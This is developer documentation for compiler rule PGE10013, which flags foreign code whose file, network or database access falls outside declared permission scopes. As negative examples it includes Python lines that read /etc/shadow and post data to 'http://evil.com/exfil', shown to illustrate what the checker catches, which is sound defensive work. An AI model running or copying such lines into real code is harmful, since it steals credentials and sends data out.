---
audience: developer
rule: "9.27"
code: PGE10013
name: Foreign Resource Outside Scope
severity: error
---

# Rule 9.27 — Foreign Resource Outside Scope
`PGE10013`

<!-- @u:concepts/permissions/foreign-code -->
<!-- @u:concepts/permissions/enforcement -->
<!-- @c:technical/algorithms/foreign-code-analysis -->

**Statement:** When the compiler's AST analysis of foreign code in a `-Run.*` pipeline or `[C]` block detects an IO call whose resource argument (file path, URL, host, connection string) is a resolvable literal or traceable variable that falls outside every declared `{_}` permission scope for that category, PGE10013 fires.
**Rationale:** Foreign code can access resources (files, network endpoints, databases) that the Aljam3 pipeline's `{_}` permissions did not authorize. When the compiler can definitively determine the resource target — via string literal or intraprocedural constant propagation — and that target falls outside declared scopes, it is a verifiable violation. This is the compile-time enforcement counterpart to runtime sandboxing.
**Detection:** During the foreign code AST walk (see [[algorithms/foreign-code-analysis]]):
1. Match each `CallExpression` against the IO sink table
2. Extract the resource argument at the known parameter position
3. If the argument is a string literal or traces to one via `trace_assignment`:
   - **File:** normalize path, glob-match against `{_}` objects with `.category #File` and matching `.scope`
   - **Network:** parse URL to extract host/port, match against `{_}` objects with `.category #Web` and matching `.host`/`.port`
   - **Database:** parse connection string, match against `{_}` objects with `.category #Database` and matching `.host`/`.port`/`.database`
4. If no matching scope is found, PGE10013 fires on the call site
5. If the argument is unresolvable, PGW10002 fires instead (warning, not error)

**See also:** PGE10012 (code file outside scope — the script itself), PGE10014 (AST-invisible code — banned constructs), PGW10002 (unverifiable foreign IO — when resource cannot be resolved), [[permissions/foreign-code#Violation Detection]]

**VALID:**
```aljam3
[ ] ✓ all IO calls within declared permission scopes
{_} _DataRead
   [.] .intent << #Grant
   [.] .category #File
   [.] .capability #Read
   [.] .scope "/data/reports/*"
   [.] .path "/data/reports/*"

{-} -AnalyzeReport
   (-) _DataRead
   (-) ;PythonUV
   [T] -T.CLI
   [Q] -Q.Default
   [W] -W.Env;PythonUV
   [ ]
   [-] -Run.Python.Script;PythonUV
      (-) <code.inline <<
         [C] import pandas as pd
         [C] df = pd.read_csv("/data/reports/q1.csv")                  [ ] ✓ within /data/reports/*
         [C] summary = df.describe().to_string()
      (-) <Bind#Record
      (-) >Bind#Record
         [.] .summary#string >> >summary
```

**INVALID:**
```aljam3
[ ] ✗ PGE10013 — file access outside declared scope
{_} _DataRead
   [.] .intent << #Grant
   [.] .category #File
   [.] .capability #Read
   [.] .scope "/data/reports/*"
   [.] .path "/data/reports/*"

{-} -ExfilData
   (-) _DataRead
   (-) ;PythonUV
   [T] -T.CLI
   [Q] -Q.Default
   [W] -W.Env;PythonUV
   [ ]
   [-] -Run.Python.Script;PythonUV
      (-) <code.inline <<
         [C] import pandas as pd
         [C] df = pd.read_csv("/data/reports/q1.csv")                  [ ] ✓ within scope
         [C] secrets = open("/etc/shadow").read()                      [ ] ✗ PGE10013 — /etc/shadow outside /data/reports/*
         [C] pd.DataFrame({"x": [secrets]}).to_csv("/tmp/exfil.csv")   [ ] ✗ PGE10013 — /tmp/exfil.csv outside scope + no #Write
      (-) <Bind#Record
      (-) >Bind#Record
         [.] .result#string >> >result
```

```aljam3
[ ] ✗ PGE10013 — network access outside declared scope
{_} _ApiAccess
   [.] .intent << #Grant
   [.] .category #Web
   [.] .capability #Request
   [.] .scope "https://api.internal.com/*"
   [.] .host "api.internal.com"

{-} -FetchExternal
   (-) _ApiAccess
   (-) ;PythonUV
   [T] -T.CLI
   [Q] -Q.Default
   [W] -W.Env;PythonUV
   [ ]
   [-] -Run.Python.Script;PythonUV
      (-) <code.inline <<
         [C] import requests
         [C] r = requests.get("https://api.internal.com/data")         [ ] ✓ within scope
         [C] x = requests.post("http://evil.com/exfil", data=r.text)   [ ] ✗ PGE10013 — evil.com outside api.internal.com
      (-) <Bind#Record
      (-) >Bind#Record
         [.] .data#string >> >data
```

**Open point:** None.
